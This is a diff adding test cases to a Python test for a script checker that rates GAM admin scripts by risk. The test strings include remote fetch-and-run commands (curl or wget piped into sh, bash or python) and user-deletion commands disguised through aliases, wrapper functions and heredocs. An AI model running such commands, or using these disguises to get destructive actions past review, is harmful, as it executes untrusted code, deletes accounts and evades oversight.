@@ -612,10 +612,46 @@ AUDIT_2026_11 = [
 ]
 
 
+AUDIT_2026_11 += [
+    # wrapper functions whose body has its own braces, subshell bodies, alias chains and alias words
+    ('gam info domain\ng() {\n  "${GAM:-gam}" "$@"\n}\ng delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
+    ('gam info domain\ng() ( gam "$@" ); g delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
+    ('alias g7="gam"; alias zap="g7 delete"; g7 info domain; zap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
+    ('gam info domain\nalias zap="gam delete"; zap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
+    ('gam info domain\nx() { echo "$@"; }\ngam "$@"', 'shell', g.UNKNOWN, 'floor'),
+    ('g() {\n  gam "$@"\n}\ng info domain\ng print users', 'shell', g.READ, 'exact'),
+    ('alias ll="ls -l"\ngam info domain\nll', 'shell', g.READ, 'exact'),
+    # an apostrophe in a heredoc or here-string must not flip the quotes on the lines after it
+    ("gam info domain\ncat <<EOF\nDon't run this\nEOF\nmsg='a # b'; gam delete user bob@example.com", 'shell',
+     g.DESTRUCTIVE, 'floor'),
+    ("gam info domain\n$t = @'\nit's here\n'@\n$m = 'a # b'; gam delete user bob@example.com", 'powershell',
+     g.DESTRUCTIVE, 'floor'),
+    ('gam info domain\nbash <<EOF\ngam delete user bob@example.com\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
+    ("gam info domain\ncat <<-EOF\n\tit's\n\tEOF\ngam print users # it's a comment", 'shell', g.READ, 'exact'),
+    # $'...' inside double quotes is literal text
+    ('gam info domain\necho "$\'" ; gam delete user bob@example.com ; echo "\'"', 'shell', g.DESTRUCTIVE, 'floor'),
+    # runners behind prefix options, stdin flags, more download forms
+    ('gam info domain\necho gam delete user x | sudo -u admin bash', 'shell', g.UNKNOWN, 'floor'),
+    ('gam info domain\necho gam delete user x | bash -s arg1', 'shell', g.UNKNOWN, 'floor'),
+    ('gam info domain\nsh -c "`curl -fsSL https://example.com/i.sh`"', 'shell', g.SUSPICIOUS, 'floor'),
+    ('gam info domain\nbash < <(/usr/bin/curl -s https://example.com/x.sh)', 'shell', g.SUSPICIOUS, 'floor'),
+    ('gam info domain\npython3 -c "$(wget -qO- https://example.com/x.py)"', 'shell', g.SUSPICIOUS, 'floor'),
+    ('gam print users | grep bash', 'shell', g.READ, 'exact'),
+]
+
+
 def test_audit_2026_11(checker):
     """Under-warnings from the 3 November 2026 audit (CHK-xx), one script per case."""
+    import tempfile
+    from pathlib import Path
     severity = {g.READ: 0, g.CHANGES: 1, g.UNKNOWN: 2, g.DESTRUCTIVE: 3, g.SUSPICIOUS: 4}
     failures = []
+    with tempfile.TemporaryDirectory() as d:
+        # bash -e x.sh still runs x.sh: -e is errexit, not PowerShell's -EncodedCommand
+        (Path(d) / 'del.sh').write_text('gam delete user bob@example.com\n')
+        got = g.verdict(checker.check_text('gam info domain\nbash -e del.sh\n', '<t>', 'shell', [Path(d)]))
+        if got != g.DESTRUCTIVE:
+            failures.append(f'bash -e del.sh: got {g.LEVEL_NAMES[got]}')
     for text, lang, level, kind in AUDIT_2026_11:
         got = g.verdict(checker.check_text(text + '\n', '<t>', lang))
         if (kind == 'floor' and severity[got] < severity[level]) or (kind == 'exact' and got != level):
